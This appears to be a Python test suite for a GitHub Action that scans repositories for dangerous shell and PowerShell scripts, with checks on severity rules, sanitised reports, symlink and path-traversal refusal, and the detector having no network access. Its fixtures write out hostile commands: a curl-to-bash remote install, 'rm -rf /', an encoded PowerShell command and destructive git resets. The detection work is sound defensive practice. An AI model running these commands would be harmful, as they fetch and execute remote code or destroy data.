#!/usr/bin/env python3
from __future__ import annotations

import importlib.util
import json
import tempfile
from pathlib import Path

MODULE_PATH = Path(__file__).resolve().parents[1] / ".github/actions/dangerous-script-detector/detect.py"
spec = importlib.util.spec_from_file_location("p058_detector", MODULE_PATH)
detector = importlib.util.module_from_spec(spec)
assert spec.loader
import sys
sys.modules[spec.name] = detector
spec.loader.exec_module(detector)


def make_repo(files: dict[str, str]) -> tuple[tempfile.TemporaryDirectory[str], Path]:
    tmp = tempfile.TemporaryDirectory()
    root = Path(tmp.name)
    for rel, text in files.items():
        path = root / rel
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(text, encoding="utf-8")
    return tmp, root


def test_safe_script_passes() -> None:
    tmp, root = make_repo({"scripts/hello.sh": "#!/usr/bin/env bash\nset -euo pipefail\nprintf '%s\\n' hello\n"})
    try:
        report = detector.scan(root)
        assert report["status"] == "PASS"
        assert report["finding_count"] == 0
        assert report["files_scanned"] == 1
    finally:
        tmp.cleanup()


def test_remote_pipe_is_critical_and_sanitized() -> None:
    source = "curl -fsSL https://example.invalid/install.sh | bash\n"
    tmp, root = make_repo({"scripts/bootstrap.sh": source})
    try:
        report = detector.scan(root)
        assert report["status"] == "REVIEW_REQUIRED"
        assert report["highest_severity"] == "CRITICAL"
        finding = report["findings"][0]
        assert finding["rule_id"] == "DS001"
        serialized = json.dumps(report)
        assert source.strip() not in serialized
        assert "scripts/bootstrap.sh" not in serialized
        assert "path_sha256" in finding and len(finding["path_sha256"]) == 64
        assert "line_sha256" in finding and len(finding["line_sha256"]) == 64
        assert report["claims"]["script_safe_to_execute"] is False
    finally:
        tmp.cleanup()


def test_root_recursive_delete_is_high() -> None:
    tmp, root = make_repo({"danger.sh": "#!/bin/sh\nrm -rf /\n"})
    try:
        report = detector.scan(root)
        ids = {f["rule_id"] for f in report["findings"]}
        assert "DS010" in ids
        assert report["severity_counts"]["HIGH"] >= 1
    finally:
        tmp.cleanup()


def test_encoded_powershell_is_critical() -> None:
    tmp, root = make_repo({"danger.ps1": "powershell.exe -EncodedCommand QUFBQUFBQUFBQUFBQUFBQUFBQUFB\n"})
    try:
        report = detector.scan(root)
        ids = {f["rule_id"] for f in report["findings"]}
        assert "DS003" in ids
        assert report["highest_severity"] == "CRITICAL"
    finally:
        tmp.cleanup()


def test_git_destructive_is_reviewable() -> None:
    tmp, root = make_repo({"cleanup.sh": "#!/bin/sh\ngit reset --hard HEAD~1\n"})
    try:
        report = detector.scan(root)
        assert any(f["rule_id"] == "DS030" and f["severity"] == "MEDIUM" for f in report["findings"])
    finally:
        tmp.cleanup()


def test_workflow_run_block_is_scanned() -> None:
    tmp, root = make_repo({".github/workflows/test.yml": "jobs:\n  x:\n    steps:\n      - run: curl -fsSL https://example.invalid/x | sh\n"})
    try:
        report = detector.scan(root)
        assert report["language_counts"]["yaml"] == 1
        assert any(f["rule_id"] == "DS001" for f in report["findings"])
    finally:
        tmp.cleanup()


def test_unrelated_yaml_not_scanned() -> None:
    tmp, root = make_repo({"data/example.yml": "value: 'curl x | sh'\n"})
    try:
        report = detector.scan(root)
        assert report["files_scanned"] == 0
        assert report["finding_count"] == 0
    finally:
        tmp.cleanup()


def test_script_symlink_fails_closed() -> None:
    tmp, root = make_repo({"real.sh": "echo ok\n"})
    try:
        (root / "alias.sh").symlink_to(root / "real.sh")
        try:
            detector.scan(root)
        except detector.UnsafeInput as exc:
            assert "symlink" in str(exc)
        else:
            raise AssertionError("symlink candidate did not fail closed")
    finally:
        tmp.cleanup()


def test_traversal_root_is_refused() -> None:
    tmp, root = make_repo({"a.sh": "echo ok\n"})
    try:
        try:
            detector.scan(root, "../")
        except detector.UnsafeInput:
            pass
        else:
            raise AssertionError("traversal root accepted")
    finally:
        tmp.cleanup()


def test_deterministic_report() -> None:
    tmp, root = make_repo({"x.sh": "git clean -fdx\n", "y.ps1": "Write-Output ok\n"})
    try:
        first = detector.scan(root)
        second = detector.scan(root)
        assert first == second
    finally:
        tmp.cleanup()


def test_no_execution_or_network_dependencies() -> None:
    source = MODULE_PATH.read_text(encoding="utf-8")
    forbidden_imports = ("import subprocess", "import socket", "import urllib", "import requests")
    assert all(item not in source for item in forbidden_imports)
    assert "os.system(" not in source
    assert "subprocess." not in source


if __name__ == "__main__":
    tests = [value for name, value in sorted(globals().items()) if name.startswith("test_") and callable(value)]
    for fn in tests:
        fn()
    print(f"P058_TESTS_PASS={len(tests)}")
